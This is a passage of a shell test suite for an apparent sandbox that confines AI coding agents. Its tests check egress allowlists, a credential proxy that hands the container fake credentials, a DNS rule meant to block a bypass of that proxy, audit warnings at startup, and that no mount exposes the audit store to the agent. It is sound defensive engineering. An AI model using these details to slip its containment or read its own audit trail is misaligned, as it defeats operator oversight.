# (project.bats feeds dig a 10.0.0.1) and those are inputs to a test, not
# addresses an operator is being told to use.
#
# This catches address- and hostname-shaped leaks only. A personal domain
# that looks like any other public one is not mechanically distinguishable
# and still rests on review.
SCANNED_PATHS=(README.md SECURITY.md ATTRIBUTION.md docs docker bin forges workflows harnesses hooks install.sh systemd .gitea)

@test "no private or link-local address is used as a documentation example" {
    # The canonical network identifiers - 10.0.0.0/8 and the rest, written out
    # in full with their own prefix length - are excluded, because a tool that
    # refuses traffic to private space has to be able to name the space it
    # refuses (docker/egress-policy). A leak is a HOST address inside one of
    # these ranges, which is a different string: the operator's Loki box was
    # 10.x.y.z with no prefix, not the range it sits in. So the exclusion is
    # exact-match on the range identifier and nothing near it - 10.0.0.0/9,
    # or 10.0.0.1, is still caught.
    run grep -rnIE '\b(10|127\.0\.0\.[2-9]|169\.254|192\.168|172\.(1[6-9]|2[0-9]|3[01]))\.[0-9]{1,3}\.[0-9]{1,3}\b' \
        "${SCANNED_PATHS[@]/#/$REPO_ROOT/}"
    local leaks
    leaks=$(printf '%s\n' "$output" | grep -v '^$' \
        | grep -vE '(^|[^0-9.])(10\.0\.0\.0/8|172\.16\.0\.0/12|192\.168\.0\.0/16|169\.254\.0\.0/16|127\.0\.0\.0/8)([^0-9/]|$)' \
        || true)
    [ -z "$leaks" ] || {
        echo "use an RFC 5737 documentation address instead:" >&2
        echo "$leaks" >&2
        false
    }
}

@test "nothing in the tree claims the container derives from a reference dev container" {
    # The README's provenance note was removed because it had stopped being
    # true: the image and the egress policy were rewritten clean-room, and what
    # remains in common is package names and one-way-to-spell-it idioms. That
    # removal is a claim about the whole repository, and nothing checked it -
    # which is how a citation in hooks/ outlived the audit, since the audit was
    # scoped to docker/.
    #
    # Scoped to the citation and the claim, not to the vendor's name: dejima
    # talks about Anthropic legitimately all over the place - a backend, an API,
    # an upstream bug, a comparison with someone else's devcontainer in
    # docs/research-review.md. What must not reappear is this repository saying
    # its own container came from that one.
    local hits
    hits=$(grep -rIn --exclude-dir=.git --exclude-dir=.worktrees \
        -e 'anthropics/claude-code/tree/[^ ]*devcontainer' \
        -e 'reference this is based on' \
        -e 'reference dev container this' \
        "$REPO_ROOT" 2>/dev/null | grep -v '^[^:]*/test/static\.bats:' || true)
    [ -z "$hits" ] || {
        echo "the tree still cites the reference dev container as what this is based on:" >&2
        echo "$hits" >&2
        echo "" >&2
        echo "If a citation is legitimate - comparing against it, linking an upstream" >&2
        echo "bug - say what it is rather than what this derives from." >&2
        false
    }
}

# The exemption above is only defensible while it is the address the docs
# actually recommend. If the recommendation changes and this does not, the
# exemption starts covering an address nothing points at - a hole rather than
# a carve-out.
@test "no hostname under a private-network suffix is used as a documentation example" {
    run grep -rnIE '[A-Za-z0-9-]+\.(localdomain|lan|internal|home\.arpa)\b' \
        "${SCANNED_PATHS[@]/#/$REPO_ROOT/}"
    [ "$status" -ne 0 ] || {
        echo "use an RFC 2606 reserved name (example.com, .invalid, .test) instead:" >&2
        echo "$output" >&2
        false
    }
}

# --- Task 9: startup warning about unacknowledged CRITICAL audit history ---

@test "dejima warns about unacknowledged critical history before starting" {
    grep -q 'CRITICAL.txt' "$REPO_ROOT/bin/dejima"
}

@test "the startup warning is emitted before the container runs" {
    warn_line=$(grep -n 'unacknowledged CRITICAL' "$REPO_ROOT/bin/dejima" | head -1 | cut -d: -f1)
    run_line=$(grep -n 'docker compose -f "\$COMPOSE_FILE" run' "$REPO_ROOT/bin/dejima" | head -1 | cut -d: -f1)
    [ "$warn_line" -lt "$run_line" ]
}

@test "the startup warning does not block when stdin is not a tty" {
    grep -q 'config_get_bool audit strict' "$REPO_ROOT/bin/dejima"
    grep -q '\-t 0' "$REPO_ROOT/bin/dejima"
}

# The three tests above are static (they hold even for a warning that never
# actually runs correctly). The ones below drive bin/dejima's real startup
# path end-to-end against a stubbed `docker` - same technique as
# test/project.bats' launch/launch_setup and test/remote.bats' stub_launch -
# so the warning is checked doing its actual job, not just present in the
# source.
teardown() {
    rm -rf ${DEJIMA_T:+"$DEJIMA_T"}
}

startup_warning_setup() {
    DEJIMA_T="$(mktemp -d)"
    mkdir -p "$DEJIMA_T/home/.claude" "$DEJIMA_T/config" "$DEJIMA_T/audit" "$DEJIMA_T/ws"
    echo '{}' > "$DEJIMA_T/home/.claude/settings.json"
    cat > "$DEJIMA_T/docker" <<'EOF'
#!/bin/bash
echo "$*" >> "${SANDBOX_TEST_DOCKER_LOG:-/dev/null}"
exit 0
EOF
    chmod +x "$DEJIMA_T/docker"
    : > "$DEJIMA_T/sandbox-key"
    chmod 600 "$DEJIMA_T/sandbox-key"
    # forge = none, workflow = local-only: provider_validate_selection runs
    # ahead of the audit-startup path these tests are actually about, and the
    # default gitea/worktree-pr pair is refused unconfigured (see
    # providers.bats) - this fixture sidesteps that with the honest
    # "no forge, no push" pair rather than configuring a forge just to get
    # past validation.
    # [harness.claude-code] backend, because it has no default and never
    # will: one dejima could change later would move a session to another
    # endpoint without its config changing (#171). A launch fixture has to
    # state it like any other operator config.
    cat > "$DEJIMA_T/config/config" <<EOF
[core]
harness = claude-code
ssh_key = $DEJIMA_T/sandbox-key
forge = none
workflow = local-only
[harness.claude-code]
backend = anthropic
[audit]
dir = $DEJIMA_T/audit
EOF
}

# Redirected from /dev/null, so this is deterministically the "stdin is not a
# tty" path - real interactive [c]ontinue/[q]uit behavior needs a pty, which
# isn't available here (see the task report).
startup_warning_launch() {
    # A launch runs dejima-update-check, which would ls-remote this checkout's
    # own origin. Off here rather than in each fixture's config, because the
    # launch is what triggers it. Its cache needs nothing further: it lands
    # under $HOME, which every launch fixture already points somewhere of its
    # own.
    printf '[core]\nupdate_check = off\n' >> "$DEJIMA_T/config/config"
    HOME="$DEJIMA_T/home" PATH="$DEJIMA_T:$PATH" \
        DEJIMA_CONFIG_DIR="$DEJIMA_T/config" \
        SANDBOX_TEST_DOCKER_LOG="$DEJIMA_T/docker-log" \
        SSH_AUTH_SOCK= ALLOWED_DOMAINS= \
        "$REPO_ROOT/bin/dejima" "$DEJIMA_T/ws" < /dev/null
}

startup_warning_slug() { printf '%s' "$DEJIMA_T/ws" | sed 's/[^a-zA-Z0-9]/-/g'; }

@test "bin/dejima's startup path stays silent about the audit with no unacknowledged CRITICAL history" {
    startup_warning_setup
    run startup_warning_launch
    [ "$status" -eq 0 ]
    [[ "$output" != *"unacknowledged CRITICAL"* ]]
    grep -q ' run --rm ' "$DEJIMA_T/docker-log"
}

@test "bin/dejima's startup warning fires for an unacknowledged CRITICAL report and still launches headlessly" {
    startup_warning_setup
    mkdir -p "$DEJIMA_T/audit/$(startup_warning_slug)"
    : > "$DEJIMA_T/audit/$(startup_warning_slug)/2020-01-01-000000-CRITICAL.txt"
    run startup_warning_launch
    [ "$status" -eq 0 ]
    [[ "$output" == *"1 unacknowledged CRITICAL"* ]]
    [[ "$output" == *"dejima-audit ack"* ]]
    grep -q ' run --rm ' "$DEJIMA_T/docker-log"
}

# Through a real pty, because the [a]/[c]/[q] prompt only exists when stdin
# is a terminal - the same reason test/remote.bats drives its picker with
# `script` rather than a pipe.
startup_warning_launch_tty() {
    local keys="$1"
    # A leading newline for the pause dejima takes before the build when it
    # printed a notice worth reading. This fixture sets [core] ssh_key, which
    # is a deprecation, so that pause fires on every launch here - and it is
    # ambient rather than the thing any of these tests is about. Answered in
    # the helper so each caller's keys still mean what they say.
    printf '\n%s' "$keys" | HOME="$DEJIMA_T/home" PATH="$DEJIMA_T:$PATH" \
        DEJIMA_CONFIG_DIR="$DEJIMA_T/config" \
        SANDBOX_TEST_DOCKER_LOG="$DEJIMA_T/docker-log" \
        SSH_AUTH_SOCK= ALLOWED_DOMAINS= TERM=xterm-256color \
        script -qec "'$REPO_ROOT/bin/dejima' '$DEJIMA_T/ws'" /dev/null
}

@test "the startup warning offers to review the findings there and then" {
    # Without this the operator is told to run a command in another terminal,
    # at the one moment when nothing is waiting on them: the container has
    # not started yet (#65).
    startup_warning_setup
    mkdir -p "$DEJIMA_T/audit/$(startup_warning_slug)"
    : > "$DEJIMA_T/audit/$(startup_warning_slug)/2020-01-01-000000-CRITICAL.txt"
    run startup_warning_launch_tty 'a
q
'
    [[ "$output" == *"[a]"* ]]
    [[ "$output" == *"review now"* ]]
    # 'a' ran the audit review in-process, rather than only naming it.
    [[ "$output" == *"dejima audit:"* ]]
}

@test "the startup warning colours the tier and the keystrokes on a terminal" {
    # The complaint is that the warning is one undifferentiated block: the
    # word that says how bad it is, the run ids, and the keys to press all
    # read the same (#65).
    startup_warning_setup
    mkdir -p "$DEJIMA_T/audit/$(startup_warning_slug)"
    : > "$DEJIMA_T/audit/$(startup_warning_slug)/2020-01-01-000000-CRITICAL.txt"
    run startup_warning_launch_tty 'c
'
    [[ "$output" == *$'\033'* ]]
}

@test "the startup warning emits no colour when it is not going to a terminal" {
    startup_warning_setup
    mkdir -p "$DEJIMA_T/audit/$(startup_warning_slug)"
    : > "$DEJIMA_T/audit/$(startup_warning_slug)/2020-01-01-000000-CRITICAL.txt"
    run startup_warning_launch
    [[ "$output" == *"unacknowledged CRITICAL"* ]]
    [[ "$output" != *$'\033'* ]]
}

@test "audit.strict = on refuses to start over unacknowledged CRITICAL history when stdin is not a tty" {
    startup_warning_setup
    printf '[audit]\nstrict = on\n' >> "$DEJIMA_T/config/config"
    mkdir -p "$DEJIMA_T/audit/$(startup_warning_slug)"
    : > "$DEJIMA_T/audit/$(startup_warning_slug)/2020-01-01-000000-CRITICAL.txt"
    run startup_warning_launch
    [ "$status" -ne 0 ]
    [[ "$output" == *"refusing to start"* ]]
    ! grep -q ' run --rm ' "$DEJIMA_T/docker-log" 2>/dev/null
}

@test "bin/dejima's startup path is unaffected when the audit dir does not exist yet" {
    # The common case for a fresh install / a workspace with no history at
    # all: DEJIMA_AUDIT_DIR itself (not just the per-workspace subdir) is
    # absent, so `find` on it fails - this must not abort the script under
    # bin/dejima's `set -euo pipefail`.
    startup_warning_setup
    rm -rf "$DEJIMA_T/audit"
    run startup_warning_launch
    [ "$status" -eq 0 ]
    [[ "$output" != *"unacknowledged CRITICAL"* ]]
    grep -q ' run --rm ' "$DEJIMA_T/docker-log"
}

@test "entrypoint terminates TLS on loopback for the proxied domain by default" {
    # The transport is normalized in exactly one place so the forwarder, the
    # cert generation, and the readiness probe cannot disagree about which
    # mode this session is in.
    grep -q 'SANDBOX_CREDENTIAL_TRANSPORT="\${SANDBOX_CREDENTIAL_TRANSPORT:-tls}"' "$SANDBOX_DIR/entrypoint.sh"
    # Which name it answers for is the selected harness's, so these assert the
    # shape rather than one harness's API hostname - see "the TLS terminator
    # answers for the harness's declared domain".
    # CN alone is not enough: Node verifies the SAN.
    grep -q 'subjectAltName=DNS:\$proxied_domain' "$SANDBOX_DIR/entrypoint.sh"
    grep -q 'CN=\$proxied_domain' "$SANDBOX_DIR/entrypoint.sh"
    grep -q 'NODE_EXTRA_CA_CERTS' "$SANDBOX_DIR/entrypoint.sh"
    grep -q '127.0.0.1 \$proxied_domain' "$SANDBOX_DIR/entrypoint.sh"
}

@test "entrypoint aborts when the forwarder never binds" {
    # A silent timeout would leave api.anthropic.com pointed at a loopback
    # port with nothing behind it - every API call then fails with a
    # connection error that gives no hint where it came from.
    grep -q 'the credential-proxy forwarder never bound' "$SANDBOX_DIR/entrypoint.sh"
    grep -q '\[credentials\] transport = loopback' "$SANDBOX_DIR/entrypoint.sh"
}

@test "the hosts entry is written only when the proxy is actually running" {
    # Under SANDBOX_CREDENTIAL_PROXY=0 there is no listener on :443, so a
    # hosts entry would black-hole the real API - which is why this cannot be
    # a compose extra_hosts entry. It must sit inside the proxy-socket guard.
    local guard body
    guard=$(grep -n 'if \[ -n "\${SANDBOX_CREDENTIAL_PROXY_SOCKET:-}" \]' "$SANDBOX_DIR/entrypoint.sh" | cut -d: -f1)
    [ -n "$guard" ]
    body=$(grep -n '127.0.0.1 \$proxied_domain' "$SANDBOX_DIR/entrypoint.sh" | cut -d: -f1)
    [ -n "$body" ] || { echo "no hosts entry at all"; return 1; }
    [ "$body" -gt "$guard" ]
}

@test "openssl is installed explicitly, not relied on transitively" {
    # entrypoint.sh generates the terminator's cert at startup; a transitive
    # dependency dropping out of the base image would break the credential
    # path at runtime rather than at build time.
    grep -qE '^\s+openssl \\$' "$SANDBOX_DIR/Dockerfile"
}

@test "entrypoint fails loudly, with a reason, if openssl cert generation fails" {
    # set -e already aborts on openssl's nonzero exit before chown/export can
    # touch a missing cert, so a failure here can't silently proceed or leak
    # the credential - but redirecting openssl's stderr to /dev/null would
    # still leave it dying silent-but-loud: nonzero exit, no explanation.
    grep -q 'if ! openssl_err=\$(openssl req -x509' "$SANDBOX_DIR/entrypoint.sh"
    grep -q 'FATAL: openssl failed to generate the TLS terminator cert' "$SANDBOX_DIR/entrypoint.sh"
    grep -q 'echo "\$openssl_err" >&2' "$SANDBOX_DIR/entrypoint.sh"
}

@test "the transport is passed through, and an unprivileged process can bind :443" {
    grep -qE '^\s*SANDBOX_CREDENTIAL_TRANSPORT:\s*\$\{SANDBOX_CREDENTIAL_TRANSPORT:-\}\s*$' "$SANDBOX_DIR/docker-compose.yml"
    # Docker already defaults this to 0, but the terminator runs as the
    # unprivileged sandbox user: pinning it means a future default change
    # fails at launch instead of silently breaking the credential path.
    #
    # Pinned on the filter container, because it is a property of a network
    # namespace and that is the container that owns one. The terminator binds
    # in the session container, which joins that namespace - so this is
    # asserted here as a declaration and in runtime.bats by reading the value
    # back from the container that has to have it.
    grep -q -- '--sysctl net.ipv4.ip_unprivileged_port_start=0' "$REPO_ROOT/bin/dejima" \
        || { echo "nothing pins the unprivileged port floor"; return 1; }
}

@test "compose does not pin api.anthropic.com to loopback unconditionally" {
    # That belongs in entrypoint.sh, inside the proxy guard - see the
    # entrypoint test above for why an unconditional entry breaks the
    # SANDBOX_CREDENTIAL_PROXY=0 path.
    ! grep -q 'extra_hosts' "$SANDBOX_DIR/docker-compose.yml"
}

@test "bin/dejima defaults to the tls transport and exports it" {
    grep -q 'SANDBOX_CREDENTIAL_TRANSPORT="\$(config_get credentials transport)"' "$REPO_ROOT/bin/dejima"
    grep -Pq 'credentials\.transport\tenum:tls\|loopback\ttls' "$REPO_ROOT/bin/dejima-config-lib.sh"
    grep -q 'export .*SANDBOX_CREDENTIAL_TRANSPORT' "$REPO_ROOT/bin/dejima"
}

@test "tls mode mounts a fake credential, never the real one, and sets no ANTHROPIC_* pair" {
    # tls mode is the one case that puts a credentials file into the
    # container: Claude Code reads .credentials.json directly when there is no
    # ANTHROPIC_AUTH_TOKEN, so the empty container-local file entrypoint.sh
    # would otherwise leave isn't enough - it needs a well-formed document,
    # with the secrets faked and the non-secret fields
    # (scopes/subscriptionType/rateLimitTier/clientId) copied so the session's
    # own UI state stays accurate.
    grep -q 'extra_mounts+=(-v "\$SANDBOX_FAKE_CREDENTIALS_FILE:\$HOME/\.claude/\.credentials\.json")' "$REPO_ROOT/bin/dejima"
    grep -q 'sandbox-credential-proxy-placeholder' "$REPO_ROOT/bin/dejima"
    grep -q 'subscriptionType' "$REPO_ROOT/bin/dejima"
    grep -q 'rateLimitTier' "$REPO_ROOT/bin/dejima"
    # Expiry is deliberately NOT mirrored from the real credential: a
    # near-term expiresAt makes Claude Code refresh with the fake refresh
    # token, fail, and log the session out.
    grep -q 'refreshTokenExpiresAt' "$REPO_ROOT/bin/dejima"
}

@test "the loopback transport still sets the base URL and placeholder token" {
    grep -q 'SANDBOX_ANTHROPIC_BASE_URL="http://127.0.0.1:18300"' "$REPO_ROOT/bin/dejima"
    grep -q 'SANDBOX_ANTHROPIC_AUTH_TOKEN="sandbox-credential-proxy-placeholder"' "$REPO_ROOT/bin/dejima"
}

# The built-in list grants to every sandbox on the host, for every project,
# with no review anywhere - so what belongs in it is what the sandbox itself
# cannot run without. A language package host reaching it is how the list
# grows one reasonable-looking entry at a time until "allowed by default"
# covers most of the internet a build would want.
#
# The route for these is an approval: `dejima-allow --global`, or a reviewed
# .dejima/allowed-domains line. Adding one back here means arguing that the
# sandbox itself needs it.
@test "no language package host is built into the allowlist" {
    run bash -c "SANDBOX_CREDENTIAL_PROXY_SOCKET=/tmp/p.sock; SANDBOX_HARNESS_DOMAINS='$(_harness_api_domains)'; source '$SANDBOX_DIR/fixed-domains.sh'; printf '%s\n' \"\${FIXED_DOMAINS[@]}\""
    [ "$status" -eq 0 ]
    for d in pypi.org files.pythonhosted.org proxy.golang.org sum.golang.org \
             crates.io static.crates.io rubygems.org gitlab.com; do
        ! grep -qx "$d" <<< "$output" || {
            echo "$d is built in; it should be an approval instead" >&2
            false
        }
    done
}

# The two values below come from the harness manifest rather than being
# written here, so these assert the wiring - a manifest that stopped
# declaring them would fail this rather than quietly allowlisting nothing.
_harness_api_domains() {
    sed -n 's/^api_domains *= *//p' "$REPO_ROOT/harnesses/claude-code/harness.conf"
}
# The endpoint the terminator stands in front of. On the PROVIDER manifest
# since #171: a harness reaches whichever endpoint it is configured for, so
# the name belongs to the endpoint rather than to the program talking to it.
_provider_proxied_domain() {
    sed -n 's/^proxied_domain *= *//p' "$REPO_ROOT/backends/anthropic/backend.conf"
}


@test "the selected harness's own domains are in the permitted set, not built into the image" {
    # A harness's own api_domains reach the permitted set through its manifest.
    # A name built into fixed-domains.sh instead would be inherited by every
    # harness while a second one still lacked its own.
    [ -n "$(_harness_api_domains)" ] || { echo "the harness declares no api_domains"; return 1; }
    # Non-comment lines only: the comment there names the harness's domains
    # to explain why they are not written in, which is prose, not a value.
    run bash -c "grep -vE '^[[:space:]]*#' '$SANDBOX_DIR/fixed-domains.sh' | grep -n 'platform\.claude\.com\|api\.anthropic\.com'"
    [ "$status" -ne 0 ] || { echo "a harness's domain is still built in:"; echo "$output"; return 1; }
    run bash -c "SANDBOX_CREDENTIAL_PROXY_SOCKET=/tmp/p.sock; SANDBOX_HARNESS_DOMAINS='$(_harness_api_domains)'; source '$SANDBOX_DIR/fixed-domains.sh'; printf '%s\n' \"\${DEJIMA_OPEN_CLASS[@]}\""
    [ "$status" -eq 0 ]
    grep -qx 'platform.claude.com' <<< "$output" || { echo "$output"; return 1; }
    # And a harness declaring none gets none, rather than the last one's.
    run bash -c "set -u; SANDBOX_CREDENTIAL_PROXY_SOCKET=/tmp/p.sock; SANDBOX_HARNESS_DOMAINS=''; source '$SANDBOX_DIR/fixed-domains.sh'; printf '%s\n' \"\${DEJIMA_OPEN_CLASS[@]}\""
    [ "$status" -eq 0 ]
    ! grep -qx 'platform.claude.com' <<< "$output" || { echo "$output"; return 1; }
}


@test "api.anthropic.com is permitted only when the proxy is off" {
    # Not unconditionally permitted: with the proxy on, the session reaches the
    # API through the forwarder rather than by resolving this name, so leaving
    # it unresolvable defeats a bypass that looks it up by DNS. When the proxy
    # is off (kill switch or API-key auth) DNS is the only path to the API, so
    # it has to be permitted - in the open class and NOT exempted from the
    # answer check, because it is a public SaaS name and an answer for it
    # pointing inside the operator's network is exactly what that check is for.
    local pd; pd="$(_provider_proxied_domain)"
    [ -n "$pd" ] || { echo "the harness declares no proxied_api_domain"; return 1; }
    run bash -c "SANDBOX_CREDENTIAL_PROXY_SOCKET=/tmp/proxy.sock; SANDBOX_BACKEND_PROXIED_DOMAIN='$pd'; source '$SANDBOX_DIR/fixed-domains.sh'; printf '%s\n' \"\${DEJIMA_OPEN_CLASS[@]}\""
    [ "$status" -eq 0 ]
    ! grep -qx 'api.anthropic.com' <<< "$output"

    run bash -c "SANDBOX_CREDENTIAL_PROXY_SOCKET=; SANDBOX_BACKEND_PROXIED_DOMAIN='$pd'; source '$SANDBOX_DIR/fixed-domains.sh'; printf '%s\n' \"\${DEJIMA_OPEN_CLASS[@]}\""
    [ "$status" -eq 0 ]
    grep -qx 'api.anthropic.com' <<< "$output"

    # Unset (a bare `docker run` that passes no socket) must behave like empty.
    # Under `set -u`, as the real consumer runs, so that dropping the `:-`
    # default fails here rather than at container start.
    run bash -c "set -u; unset SANDBOX_CREDENTIAL_PROXY_SOCKET; SANDBOX_BACKEND_PROXIED_DOMAIN='$pd'; source '$SANDBOX_DIR/fixed-domains.sh'; printf '%s\n' \"\${DEJIMA_OPEN_CLASS[@]}\""
    [ "$status" -eq 0 ]
    grep -qx 'api.anthropic.com' <<< "$output"

    # And it is never exempted from the answer check, which is the half that
    # would make permitting it a way into the operator's own network.
    run bash -c "set -u; unset SANDBOX_CREDENTIAL_PROXY_SOCKET; SANDBOX_BACKEND_PROXIED_DOMAIN='$pd'; source '$SANDBOX_DIR/fixed-domains.sh'; printf '%s\n' \"\${DEJIMA_INTERNAL_CLASS[@]+\${DEJIMA_INTERNAL_CLASS[@]}}\""
    [ "$status" -eq 0 ]
    ! grep -qx 'api.anthropic.com' <<< "$output" \
        || { echo "the proxied domain is exempt from the answer check"; return 1; }
}

@test "an unrecognised SANDBOX_CREDENTIAL_TRANSPORT is rejected, not silently treated as loopback" {
    # bin/dejima branches on `loopback`, entrypoint.sh and the forwarder on
    # `tls` - so a typo configures the two halves for different transports and
    # every API call fails with nothing naming the cause.
    grep -q 'FATAL: SANDBOX_CREDENTIAL_TRANSPORT is set to' "$SANDBOX_DIR/entrypoint.sh"
    grep -q "The only valid values are 'tls' (the default) and 'loopback'" "$SANDBOX_DIR/entrypoint.sh"
    # Ahead of the proxy-socket guard, so it catches the typo whatever else
    # this session is configured for.
    local check guard
    check=$(grep -n 'FATAL: SANDBOX_CREDENTIAL_TRANSPORT is set to' "$SANDBOX_DIR/entrypoint.sh" | cut -d: -f1)
    guard=$(grep -n 'if \[ -n "\${SANDBOX_CREDENTIAL_PROXY_SOCKET:-}" \]' "$SANDBOX_DIR/entrypoint.sh" | cut -d: -f1)
    [ "$check" -lt "$guard" ]
}

@test "core names no forge" {
    # What keeps core free of forge names. Each file gets a narrow, justified
    # exclusion rather than a whole-file skip; everything else must match
    # nothing. Two scans, different subjects:
    #
    # (1) `gitea` and `github.com` as case-insensitive substrings, which
    #     catches a PROSE leak ("push to the Gitea remote") as much as a
    #     coupling.
    # (2) Every name `provider_list forge` reports, in literal position -
    #     derived from the shipped directories, so a new forge is covered the
    #     day it lands. Scan 1 missed exactly that: bare `github` matches
    #     neither alternative, so core could compare a forge name with this
    #     test green.
    #
    #     "Literal position" means quoted, backticked, a config section,
    #     `forge.`-prefixed, under `forges/`, or a case arm - not a bare-word
    #     scan, because `none` is an ordinary English word and `github` also
    #     names a core feature predating the forge axis (`[github]
    #     token_file`, `--allow-github-push`). Remedy text naming a config
    #     VALUE is outside these shapes too: a rule that refuses a
    #     combination has to say which one works.
    local f matches fail=0 name literals="" body
    while IFS= read -r name; do
        [ -n "$name" ] || continue
        # The last alternative is a `case` arm - anchored to the start of a
        # line (optionally after other arms' `|`) so it is the shape bash
        # actually uses, not any prose that happens to close a parenthesis
        # after the word.
        literals="${literals:+$literals|}[\"'\`]$name[\"'\`]|\\[$name\\]|forge\\.$name|forges/$name|^[[:space:]]*[(|]?$name\\)|\\|$name\\)"
    done < <(bash -c 'source "$1"; provider_list forge' _ "$REPO_ROOT/bin/dejima-provider-lib.sh")
    [ -n "$literals" ] || { echo "no shipped forges to build the pattern from"; return 1; }
    for f in "$REPO_ROOT/bin/dejima" "$REPO_ROOT/bin/dejima-config-lib.sh" \
             "$REPO_ROOT/bin/dejima-provider-lib.sh" "$REPO_ROOT/docker/entrypoint.sh" \
             "$REPO_ROOT/docker/docker-compose.yml" "$REPO_ROOT/hooks/git-push-guard.sh" \
             "$REPO_ROOT/hooks/merge-guard.sh" "$REPO_ROOT/hooks/sandbox-context.sh"; do
        # _warn_legacy_env's table names the OLD environment variables
        # (GITEA_SSH_HOST, GITEA_API, ...) dejima read directly before the
        # manifest schema replaced them - a one-time migration aid for an
        # operator's existing shell profile. Those names only ever meant
        # gitea (nothing else was ever wired that way) and do not change when
        # a forge is added or removed, so excluding the function body - the
        # same range test/config.bats isolates by name for its own "every
        # retired variable" test - is exempting history, not a live coupling.
        # A no-op for every other file here: none of them define it.
        body="$(sed '/^_warn_legacy_env()/,/^}/d' "$f")"
        matches="$(grep -inE 'gitea|github\.com' <<< "$body" || true)"
        matches="$matches"$'\n'"$(grep -nE "$literals" <<< "$body" || true)"
        case "$f" in
            */bin/dejima)
                # A citation of an external issue URL, the same category as
                # hooks/sandbox-context.sh:3 below.
                matches="$(grep -vE 'claude-code/issues/29162' <<< "$matches" || true)"
                # --allow-github-push widening DEJIMA_PUSH_HOSTS with
                # github.com/ssh.github.com - the identical "GitHub read-only
                # [here, push], independent of forge selection" exception
                # docker/entrypoint.sh and docker-compose.yml already get
                # below, not a forge coupling.
                matches="$(grep -vE 'github\.com' <<< "$matches" || true)"
                # `[github] token_file` and the pairing that resolves it: the
                # CORE config section holding the read-only GitHub credential
                # every session gets whatever forge is selected. Same feature
                # as the exception above, in its config-file spelling - the
                # section predates the forge axis and would still exist with
                # every forge directory deleted.
                matches="$(grep -vE '\[github\] token_file|GH_TOKEN=github token_file' <<< "$matches" || true)"
                ;;
            */bin/dejima-config-lib.sh)
                # core.forge's schema DEFAULT - real data (today there is
                # exactly one shipped forge to default to), not a row a new
                # forge needs to edit. Its TYPE, provider:forge, is what is
                # structural, and that names no forge; github.token_file
                # (GitHub as a read-only source, independent of forge
                # selection - see the identical exception in the briefing
                # prose below) and the bare "github" section name it lives in
                # don't contain "github.com" and so never match this pattern
                # at all.
                matches="$(grep -vE ':core\.forge	provider:forge	gitea$' <<< "$matches" || true)"
                ;;
            */docker/entrypoint.sh|*/docker/docker-compose.yml)
                # Implements GitHub read-only (git's github.com credential
                # helper, and the comment on it) - a core feature independent
                # of which forge is configured, not a coupling to one. Same
                # feature the "GitHub read-only" prose exception below names.
                matches="$(grep -vE 'github\.com' <<< "$matches" || true)"
                # `network_mode: none` is Docker's own value for "no network",
                # which collides with a shipped forge's name and with nothing
                # else about it. Scoped to the key AND the value, not to either
                # alone: excluding every `network_mode` line would hide a real
                # forge name written on one, and excluding the bare word would
                # hide it anywhere in the file.
                matches="$(grep -vE 'network_mode: .*none' <<< "$matches" || true)"
                ;;
            */hooks/sandbox-context.sh)
                # A citation of Anthropic's own devcontainer, not a forge.
                matches="$(grep -vE 'anthropics/claude-code/tree' <<< "$matches" || true)"
                ;;
        esac
        # The two scans are concatenated with a newline, so an empty one
        # leaves a blank line rather than nothing at all.
        matches="$(grep -v '^$' <<< "$matches" || true)"
        if [ -n "$matches" ]; then
            echo "$f still names a forge:"
            echo "$matches"
            fail=1
        fi
    done
    [ "$fail" -eq 0 ]
}

@test "no container mount covers the audit store" {
    # The audit now keeps retained diffs of pre-session content under
    # ~/.local/share/dejima. Everything about that is premised on the
    # container not being able to read them - so a future mount that reaches
    # it must break a test rather than silently opening the boundary.
    # ~/.local/share/nvim is mounted (a named volume); its PARENT must not be.
    run grep -nE '^\s*-\s*\$\{HOME\}/\.local/share:' "$SANDBOX_DIR/docker-compose.yml"
    [ "$status" -ne 0 ]
    run grep -nE '^\s*-\s*\$\{HOME\}/\.local/share/dejima' "$SANDBOX_DIR/docker-compose.yml"
    [ "$status" -ne 0 ]
    run grep -nE '^\s*-\s*\$\{HOME\}/\.local:' "$SANDBOX_DIR/docker-compose.yml"
    [ "$status" -ne 0 ]
    run grep -nE '^\s*-\s*\$\{HOME\}:' "$SANDBOX_DIR/docker-compose.yml"
    [ "$status" -ne 0 ]
}

@test "every suite is run by CI, and the two that need their own job have one" {
    # Derived from the directory rather than a list kept here, so adding a
    # test file fails this until the workflow is told about it. A suite nobody
    # wired into CI runs nowhere, and nothing else would say so.
    #
    # Two suites are not matrix entries because they cannot be. runtime.bats
    # needs a Docker daemon; ci-runner.bats asserts on the runner itself and
    # has to run once per tier rather than once per suite. Both are checked
    # below for having a job of their own instead - "not in the matrix" must
    # not be a way to be in neither.
    local wf="$REPO_ROOT/.gitea/workflows/tests.yml"
    local f base missing=""
    for f in "$REPO_ROOT"/test/*.bats; do
        base="$(basename "$f" .bats)"
        case "$base" in runtime|ci-runner) continue ;; esac
        grep -qE "^ *- *$base\$" "$wf" || missing="$missing $base"
    done
    [ -z "$missing" ] || {
        echo "these suites are not in the sandbox matrix, so CI never runs them:$missing" >&2
        false
    }

    # runtime.bats belongs to the other job, and must not be a matrix entry:
    # that job runs on a generic runner with no Docker daemon, so it would
    # fail every time rather than testing anything.
    ! grep -qE '^ *- *runtime$' "$wf"
    grep -q 'test/runtime.bats' "$wf"

    # ci-runner.bats likewise, and once per tier: a single job would leave one
    # of the two runners unasserted, which is the thing it exists to catch.
    ! grep -qE '^ *- *ci-runner$' "$wf"
    grep -q 'test/ci-runner.bats' "$wf"
    grep -q 'DEJIMA_CI_TIER: confined' "$wf"
    grep -q 'DEJIMA_CI_TIER: privileged' "$wf"
}

# test/remote.bats used to stand in a failing exit-time audit by overwriting
# `$REPO_ROOT/bin/dejima-audit` and restoring it afterwards. The restore does
# not happen if the run is killed partway, and two runs of that file at once
# restore each other's stub, so a suite could pass while leaving the real
# audit disabled - and a file watcher looking at the tree during the window
# sees a security tool replaced by a two-line `exit 3`, which reads exactly
# like an attack.
#
# Tests get a throwaway copy to mutate instead. Redirects and removals are
# what actually went wrong, so those are what this pins; a test that finds
# some third way to write into the checkout is not covered.
@test "no test suite writes into the repository it is testing" {
    run grep -rnE '(>>?|rm +(-[a-zA-Z]+ +)*)[[:space:]]*"?\$\{?(REPO_ROOT|BATS_TEST_DIRNAME)' \
        "$REPO_ROOT"/test/*.bats
    [ "$status" -ne 0 ] || {
        echo "a test writes into the checkout; give it a copy instead:" >&2
        echo "$output" >&2
        false
    }
}

@test "the agent briefing teaches the project scope, not just global" {
    # The observed failure: an agent asked for a project-specific domain to be
    # added container-wide and globally, because --project was never named.
